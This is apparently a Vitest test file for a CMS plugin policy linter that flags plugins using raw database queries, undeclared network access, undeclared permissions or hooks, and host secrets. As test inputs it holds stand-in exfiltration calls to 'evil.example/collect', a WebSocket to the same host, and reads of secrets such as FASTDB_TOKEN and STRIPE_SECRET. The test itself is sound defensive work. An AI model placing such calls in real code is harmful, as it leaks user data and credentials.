import { describe, expect, it } from 'vitest';
import { parseSync } from 'vite';
import { EXTENSION_POINT_EXPORTS, lintPlugin } from '../src/plugin-policy.js';

const manifest = {
  schemaVersion: 1, name: 'support-desk', version: '1.0.0',
  resources: [{ name: 'tickets', fields: { subject: { kind: 'string' } }, access: { update: { permission: 'support-desk/tickets:update' } } }],
  hooks: [{ point: 'cms.resource.before-write', version: 1 }],
  permissions: { resources: { 'cms/posts': ['read'] }, network: ['api.example.com'], define: ['support-desk:triage'] },
  commands: [{ name: 'close', description: 'Close tickets.', permission: 'support-desk:triage' }],
};
const lint = (source, override = {}) => lintPlugin({ manifest: { ...manifest, ...override }, files: [{ path: 'src/plugins/support-desk/server.ts', source }], parse: parseSync });
const codes = (source, override = {}) => lint(source, override).map(diagnostic => diagnostic.code);

describe('plugin policy', () => {
  it('accepts a plugin that stays within its manifest', () => {
    expect(lint(`
      import { beforeWrite, hasPermission, type PluginContext } from '@cossackframework/cms';
      import type { CmsHost } from '@cossackframework/cms/server';
      import { RecordId } from '@cossackframework/fastdb/values';
      export function register(context: PluginContext) {
        context.hooks.addFilter(beforeWrite, draft => draft);
        context.commands.add('close', async (_input, { principal }) => {
          if (!hasPermission(principal, 'support-desk:triage')) return 0;
          await context.fetch(\`https://api.example.com/tickets/\${1}\`);
          return (await context.cms.resource('cms/posts').list({}, { principal })).records.length;
        });
      }
      export const label = 'Select a ticket from the list';
      fetch('/api/support/tickets');
    `)).toEqual([]);
  });

  it('rejects raw FastQL, the FastDB client and host internals', () => {
    const diagnostics = lint(`
      import { createFastDB } from '@cossackframework/fastdb';
      import { createCMS } from '@cossackframework/cms/server';
      export async function register(context: any) {
        await context.cms.db.read([{ sql: 'x' }]);
        const query = 'SELECT * FROM r__cms__posts WHERE id = 1';
        const other = \`DELETE FROM cms_users WHERE id = \${context.id}\`;
      }
    `);
    expect(diagnostics.map(diagnostic => diagnostic.code)).toEqual(Array(5).fill('COSSACK_PLUGIN_RAW_QUERY'));
    expect(diagnostics[0]).toMatchObject({ file: 'src/plugins/support-desk/server.ts', line: 2, column: 7 });
    expect(diagnostics[2].message).toContain('db.read');
  });

  it('rejects undeclared network access', () => {
    expect(codes(`
      export async function register(context: any) {
        await fetch('https://evil.example/collect');
        await context.fetch('https://evil.example/collect');
        await context.fetch(context.url);
        new WebSocket('wss://evil.example');
      }
    `)).toEqual(['COSSACK_PLUGIN_NETWORK', 'COSSACK_PLUGIN_NETWORK', 'COSSACK_PLUGIN_NETWORK', 'COSSACK_PLUGIN_NETWORK']);
    expect(codes(`import net from 'node:net'; export const x = net;`)).toEqual(['COSSACK_PLUGIN_NETWORK']);
    expect(codes(`export const x = (c: any) => c.fetch('https://api.example.com/ok');`)).toEqual([]);
  });

  it('rejects undeclared permissions, resources and hooks', () => {
    expect(codes(`
      import { afterCommit, hasPermission } from '@cossackframework/cms';
      export function register(context: any, principal: any) {
        hasPermission(principal, 'cms:users');
        context.cms.resource('cms/pages');
        context.hooks.addAction(afterCommit, () => {});
        return { access: { read: { permission: 'support-desk:secret' } } };
      }
    `)).toEqual(['COSSACK_PLUGIN_PERMISSION', 'COSSACK_PLUGIN_PERMISSION', 'COSSACK_PLUGIN_HOOK', 'COSSACK_PLUGIN_PERMISSION']);
    const manifestOnly = lintPlugin({ manifest: { ...manifest, commands: [{ name: 'close', description: 'x', permission: 'cms:users' }] }, files: [], parse: parseSync });
    expect(manifestOnly).toEqual([expect.objectContaining({ code: 'COSSACK_PLUGIN_PERMISSION', file: 'src/plugins/support-desk/plugin.json' })]);
  });

  it('treats the collections a plugin ships as its own', () => {
    const source = `export const loaders = { entry: (_: unknown, { cms, principal }: any) => cms.resource('cms/projects').list({}, { principal }) };`;
    expect(codes(source)).toEqual(['COSSACK_PLUGIN_PERMISSION']);
    expect(codes(source, { collections: [{ name: 'projects', label: 'Projects', singular: 'Project', fields: {} }] })).toEqual([]);
  });

  it('rejects host secrets', () => {
    expect(codes(`
      export function read(c: any, env: any) {
        return [c.env.FASTDB_TOKEN, env.APP_SECRET, process.env.HOME, env['STRIPE_SECRET']];
      }
    `)).toEqual(['COSSACK_PLUGIN_SECRET', 'COSSACK_PLUGIN_SECRET', 'COSSACK_PLUGIN_SECRET', 'COSSACK_PLUGIN_SECRET']);
  });

  it('confines request-context access to the plugin-scoped host', () => {
    expect(codes(`export const ok = (c: any) => c.get('cms').pluginCms('support-desk').resource('support-desk/tickets');`)).toEqual([]);
    expect(codes(`export const whole = (c: any) => c.get('cms').resource('cms/posts');`)).toEqual(['COSSACK_PLUGIN_RAW_QUERY']);
    expect(codes(`export const other = (c: any) => c.get('cms').pluginCms('billing');`)).toEqual(['COSSACK_PLUGIN_PERMISSION']);
    expect(codes(`export const auth = (c: any) => c.get('cmsAuth');`)).toEqual(['COSSACK_PLUGIN_RAW_QUERY']);
  });

  it('reports a file that does not parse', () => {
    expect(codes('export const = ;')).toEqual(['COSSACK_PLUGIN_PARSE']);
  });

  it('maps every CMS extension point export', async () => {
    const hooks = await import('../../cms/src/hooks.ts');
    expect(Object.fromEntries(hooks.EXTENSION_POINTS.map(point => [Object.entries(hooks).find(([, value]) => value === point)[0], point.name]))).toEqual(EXTENSION_POINT_EXPORTS);
  });
});
